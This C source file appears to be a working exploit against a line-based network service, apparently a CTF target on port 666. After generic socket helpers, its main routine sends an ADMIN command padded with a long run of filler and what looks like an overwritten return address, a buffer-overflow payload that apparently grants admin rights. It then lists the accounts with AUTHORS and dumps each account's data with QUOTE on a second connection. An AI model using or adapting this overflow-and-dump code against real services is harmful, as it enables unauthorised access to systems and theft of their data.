#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <netdb.h>
#include <sys/types.h>
#include <errno.h>
#include <unistd.h>

#define MAXLINE 512

static ssize_t
my_read(int fd, char *ptr)
{
        static int      read_cnt = 0;
        static char     *read_ptr;
        static char     read_buf[MAXLINE];

        if (read_cnt <= 0) {
again:
                if ( (read_cnt = read(fd, read_buf, sizeof(read_buf))) < 0) {
                        if (errno == EINTR)
                                goto again;
                        return(-1);
                } else if (read_cnt == 0)
                        return(0);
                read_ptr = read_buf;
        }

        read_cnt--;
        *ptr = *read_ptr++;
        return(1);
}

ssize_t
readline(int fd, void *vptr, size_t maxlen)
{
        int             n, rc;
        char    c, *ptr;

        ptr = vptr;
        for (n = 1; n < maxlen; n++) {
                if ( (rc = my_read(fd, &c)) == 1) {
                        *ptr++ = c;
                        if (c == '\n')
                                break;  /* newline is stored, like fgets() */
                } else if (rc == 0) {
                        if (n == 1)
                                return(0);      /* EOF, no data read */
                        else
                                break;          /* EOF, some data was read */
                } else
                        return(-1);             /* error, errno set by read() */
        }

        *ptr = 0;       /* null terminate like fgets() */
        return(n);
}
/* end readline */


ssize_t                                         /* Write "n" bytes to a descriptor. */
writen(int fd, const void *vptr, size_t n)
{
        size_t          nleft;
        ssize_t         nwritten;
        const char      *ptr;

        ptr = vptr;
        nleft = n;
        while (nleft > 0) {
                if ( (nwritten = write(fd, ptr, nleft)) <= 0) {
                        if (errno == EINTR)
                                nwritten = 0;           /* and call write() again */
                        else
                                return(-1);                     /* error */
                }

                nleft -= nwritten;
                ptr   += nwritten;
        }
        return(n);
}
/* end writen */

int
tcp_connect(const char *host, const char *serv)
{
        int                             sockfd, n;
        struct addrinfo hints, *res, *ressave;

        bzero(&hints, sizeof(struct addrinfo));
        hints.ai_family = AF_UNSPEC;
        hints.ai_socktype = SOCK_STREAM;

        if ( (n = getaddrinfo(host, serv, &hints, &res)) != 0) {
                printf("tcp_connect error for %s, %s: %s",
                                 host, serv, gai_strerror(n));
		exit(1);
	}
        ressave = res;

        do {
                sockfd = socket(res->ai_family, res->ai_socktype, res->ai_protocol);
                if (sockfd < 0)
                        continue;       /* ignore this one */

                if (connect(sockfd, res->ai_addr, res->ai_addrlen) == 0)
                        break;          /* success */

                close(sockfd);  /* ignore this one */
        } while ( (res = res->ai_next) != NULL);

        if (res == NULL) {       /* errno set from final connect() */
                printf("tcp_connect error for %s, %s", host, serv);
	}

        freeaddrinfo(ressave);

        return(sockfd);
}
/* end tcp_connect */

int write_str(int s, char *str)
{
	return writen(s, str, strlen(str));
}

int main (int argc, char *argv[])
{
	int sockfd;
	int quotefd;
	char buf[4096];
	int i, n;
	int number_of_accounts;
	char *host;
	char sendbuf[4096] = "ADMIN \"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBBCCCCCCCCDDDDDDDDEEEEEEEEFFFFFFFFGGGG\x87\x16\x40\" \"PASSWORD\"\r\n";
	char author[255][4096];
	char *port = "666";

	host = argv[1];

	sockfd = tcp_connect(host, port);
	quotefd = tcp_connect(host, port);
	
	n = write_str(sockfd, sendbuf);
	//printf("write[%d]: %s", n, sendbuf);

	readline(sockfd, buf, sizeof(buf));
	buf[strlen(buf)-2] = 0;
	//printf("read: %s\n", buf);

	write_str(sockfd, "AUTHORS a\r\n");

	n = readline(sockfd, buf, sizeof(buf));
	buf[strlen(buf)-2] = 0;
	//printf("read[%d]: %s\n", n, buf);

	number_of_accounts = atoi(buf);
	//printf("number of accounts: %d\n", number_of_accounts);

	for(i=0;i<number_of_accounts;i++) {
		readline(sockfd, author[i], sizeof(author[i]));
		author[i][strlen(author[i])-2] = 0;
		///printf("read: %s\n", author[i]);

	}

	for(i=0;i<number_of_accounts;i++) {
		sprintf(sendbuf, "QUOTE \"%s\" 1\r\n", author[i]);
		n = write_str(quotefd, sendbuf);
		//printf("write[%d]: '%s'", n, sendbuf);

		n = readline(quotefd, buf, sizeof(buf));
		buf[strlen(buf)-2] = 0;
		//printf("read[%d]: '%s'", n, buf);
		printf("%s\n", buf);
	}

	return 0;
}
